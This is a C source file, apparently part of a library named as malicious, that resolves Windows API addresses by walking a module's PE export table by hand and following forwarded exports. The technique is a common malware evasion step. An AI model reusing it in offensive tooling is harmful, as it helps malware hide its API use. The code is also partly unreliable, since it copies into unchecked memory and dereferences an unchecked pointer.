//
// skulk@ioc.ninja
//
#include "xOsReplacementApi.h"

#include <stdint.h>

#include "xLibMaliciousApi.h"



void* xOsReplacementApiGetProcAddress(HANDLE module, const char* name)
{
	const IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*) module; 

	if (idh->e_magic != IMAGE_DOS_SIGNATURE) 
	{ 
		return NULL;    
	} 

	const IMAGE_NT_HEADERS* inh = (IMAGE_NT_HEADERS*) (((uint8_t*) idh) + idh->e_lfanew); 

	if (inh->Signature != IMAGE_NT_SIGNATURE) 
	{ 
		return NULL;    
	} 

	const IMAGE_OPTIONAL_HEADER* ioh = &inh->OptionalHeader; 

	const IMAGE_DATA_DIRECTORY* idd = &ioh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	const IMAGE_EXPORT_DIRECTORY* ied = (IMAGE_EXPORT_DIRECTORY*) ((uintptr_t) idh + idd->VirtualAddress); 

	const uint32_t* aon = (uint32_t*) ((uint8_t*) module + ied->AddressOfNames);

	const uint32_t* aof = (uint32_t*) ((uint8_t*) module + ied->AddressOfFunctions);

	for (uint32_t i = 0; i < ied->NumberOfNames; i++)
	{
		const char* functionName = (char*) ((uint8_t*) module + aon[i]);

		const uint16_t* functionOrderNumber = (uint16_t*) ((uint8_t*) module + ied->AddressOfNameOrdinals);

		if (strcmp(name, functionName) == 0)
		{
			if (aof[functionOrderNumber[i]] >= idd->VirtualAddress &&  aof[functionOrderNumber[i]] < idd->VirtualAddress + idd->Size)
			{
				const size_t length = strlen((char*) module + aof[functionOrderNumber[i]]);

				char* forwardModule = (char*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(length  + sizeof(char));

				strcpy(forwardModule, (char*) module + aof[functionOrderNumber[i]]);

				if (forwardModule)
				{
					char* forwardName = strchr(forwardModule, '.');

					*forwardName++ = 0;

					module = LoadLibraryA(forwardModule);

					void* forward = NULL;

					if (module)
					{
						forward = X_LIB_MALICIOUS_CALL(xOsReplacementApiGetProcAddress)(module, forwardName);
					}

					X_LIB_MALICIOUS_CALL(xMemoryFree)(forwardModule);

					return forward;
				}
			}

			return (void*) ((uint8_t*) module + aof[functionOrderNumber[i]]);
		}  
	}

	return NULL;
}
